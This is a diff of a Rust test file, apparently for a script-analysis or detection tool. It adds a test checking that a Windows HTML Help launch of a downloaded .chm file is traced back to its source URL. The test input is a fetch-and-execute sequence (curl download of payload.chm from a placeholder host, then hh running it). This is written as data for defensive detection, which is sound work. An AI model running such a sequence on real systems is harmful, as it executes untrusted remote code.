@@ -11786,6 +11786,27 @@ hh payload.chm"#,
     }
 
     #[test]
+    fn html_help_current_dir_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.chm https://hh-dot-source.example/payload.chm
+hh .\payload.chm"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"hh .\payload.chm"#
+                            && url == "https://hh-dot-source.example/payload.chm"
+                )
+            }),
+            "HTML Help current-directory launch did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn html_help_member_path_resolves_prior_download_source_url() {
         let report = crate::analyze(
             br#"curl -o payload.chm https://hh-member-source.example/payload.chm
